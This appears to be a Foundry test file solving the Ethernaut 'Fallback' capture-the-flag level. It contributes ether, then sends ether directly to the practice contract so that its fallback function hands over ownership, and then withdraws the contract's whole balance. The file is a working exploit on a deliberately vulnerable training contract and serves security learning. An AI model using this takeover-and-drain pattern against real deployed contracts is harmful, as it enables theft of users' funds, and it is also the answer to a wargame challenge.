// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Fallback, FallbackFactory} from "ethernaut/levels/FallbackFactory.sol";

contract FallbackLevel is SetUpLevelTest {
    Fallback internal fback;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0.001 ether;
        playerBalance = 1000 ether;
        level = address(new FallbackFactory());
        super.setUp();
        fback = Fallback(payable(instance));

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        emit log_named_uint(
            "fback balance before exploit",
            address(fback).balance
        );
        fback.contribute{value: 0.0001 ether}();
        (bool success, ) = address(fback).call{value: 0.0001 ether}("");
        assert(success);
        assert(fback.owner() == player);
        fback.withdraw();
        emit log_named_uint(
            "fback balance after exploit",
            address(fback).balance
        );
        vm.stopPrank();
    }
}
